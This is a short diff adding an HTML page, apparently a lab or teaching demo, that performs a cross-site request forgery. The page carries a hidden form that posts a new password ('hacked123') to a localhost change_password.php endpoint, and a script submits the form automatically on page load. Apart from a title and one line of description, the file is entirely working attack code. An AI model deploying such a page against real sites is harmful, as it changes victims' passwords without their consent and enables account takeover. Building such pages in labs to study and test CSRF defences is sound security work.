@@ -1,0 +1,16 @@
+<!-- CSRF Attack Page -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CSRF Demo Page</h2>
+    <p>This page simulates a password change without user consent.</p>
+
+    <form action="http://localhost/change_password.php" method="POST" id="csrfForm">
+      <input type="hidden" name="newpass" value="hacked123" />
+    </form>
+
+    <script>
+      document.getElementById("csrfForm").submit(); // Auto-submit
+    </script>
+  </body>
+</html>
